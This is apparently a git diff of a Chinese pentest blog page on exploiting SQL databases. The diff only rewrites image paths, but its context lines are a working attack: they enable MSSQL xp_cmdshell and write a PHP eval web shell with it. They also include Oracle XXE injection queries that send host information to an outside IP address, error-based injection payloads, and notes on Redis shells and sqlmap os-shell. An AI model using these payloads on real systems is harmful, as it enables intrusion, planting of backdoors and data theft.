@@ -389,14 +389,14 @@ EXEC sp_configure &#39;xp_cmdshell&#39;,1;
 RECONFIGURE;
 </code></pre>
 <p>就可以执行命令了</p>
-<pre><code>exec master..xp_cmdshell whoami</code></pre><p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210917154813489.png" alt="image-20210917154813489"></p>
+<pre><code>exec master..xp_cmdshell whoami</code></pre><p><img src="/2021/09/16/sql深度利用/image-20210917154813489.png" alt="image-20210917154813489"></p>
 <p>写shell</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210917154153456.png" alt="image-20210917154153456"></p>
+<p><img src="/2021/09/16/sql深度利用/image-20210917154153456.png" alt="image-20210917154153456"></p>
 <p>正确用法:</p>
 <pre><code class="sql">EXEC  master..xp_cmdshell &quot;echo ^&lt;?php @eval($_POST[666]);?^&gt; &gt;C:\xampp\tomcat\webapps\manager&quot;;</code></pre>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210917154340842.png" alt="image-20210917154340842"></p>
+<p><img src="/2021/09/16/sql深度利用/image-20210917154340842.png" alt="image-20210917154340842"></p>
 <p>路径没权限。。。忘记写文件名了:</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210917154558599.png" alt="image-20210917154558599"></p>
+<p><img src="/2021/09/16/sql深度利用/image-20210917154558599.png" alt="image-20210917154558599"></p>
 <pre><code class="mssql">EXEC  master..xp_cmdshell &quot;echo ^&lt;?php @eval($_POST[666]);?^&gt; &gt;D:\\test\\1.php&quot;;</code></pre>
 <p>前提是sa权限，同样需要查看当前用户。</p>
 <p>xp_cmdshell无法用，下面是实战中sql注入利用sp_oacreate</p>
@@ -420,7 +420,7 @@ RECONFIGURE;
 <pre><code>用如下的命令可以使删除键生效：
 
 stty erase ^H</code></pre><p>首先查版本:</p>
-<pre><code>SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</code></pre><p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210922140520265.png" alt="image-20210922140520265"></p>
+<pre><code>SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</code></pre><p><img src="/2021/09/16/sql深度利用/image-20210922140520265.png" alt="image-20210922140520265"></p>
 <h2><span id="get_domain_index_tables执行系统命令">GET_DOMAIN_INDEX_TABLES执行系统命令：</span></h2><p>实用版本，实测11.2.0.1.0不行。网上版本:</p>
 <p>Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2</p>
 <p>漏洞成因:</p>
@@ -438,17 +438,17 @@ select extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot
 select extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://47.99.168.203:8000/&#39;||(select utl_inaddr.get_host_address from dual)||&#39;&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) from dual;
 根据内网IP解析主机名
 select extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://47.99.168.203:8000/&#39;||(select utl_inaddr.get_host_name(&#39;172.17.0.2&#39;) from dual)||&#39;&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) from dual;</code></pre>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210922141937707.png" alt="image-20210922141937707"></p>
+<p><img src="/2021/09/16/sql深度利用/image-20210922141937707.png" alt="image-20210922141937707"></p>
 <p>报错注入：</p>
 <p>utl_inaddr.get_host_name</p>
 <p>用法:select utl_inaddr.get_host_name((select version FROM v$instance)) from dual;</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210922142814322.png" alt="image-20210922142814322"></p>
+<p><img src="/2021/09/16/sql深度利用/image-20210922142814322.png" alt="image-20210922142814322"></p>
 <p>其中host后是回显位</p>
 <h3><span id="0x04-redis">0x04 Redis</span></h3><p>利用方式百度即可。</p>
 <p>这个因为大部分是内网，记录下特殊情况，例如都OK为啥shell不回来，然后是centos和ubuntu写定时任务区别。</p>
 <pre><code>都OK可能是被waf拦截了，这种情况shell是回来了马上断掉，其余情况还没解决</code></pre><h3><span id="0x04sqlmap-getshell">0X04sqlmap-getshell</span></h3><p>sqlmap在windows注入较慢，在vps上注入快，sqlmap版本是否对注入结果有影响。tamper的使用帮助注入成功。</p>
 <p>-os–shell利用</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20210916204542134.png" alt="image-20210916204542134"></p>
+<p><img src="/2021/09/16/sql深度利用/image-20210916204542134.png" alt="image-20210916204542134"></p>
 <p>没有结果。</p>
 <h3><span id="0x05其余思路">0x05其余思路</span></h3><p>查敏感数据,读配置文件</p>
 <p>常规提权</p>
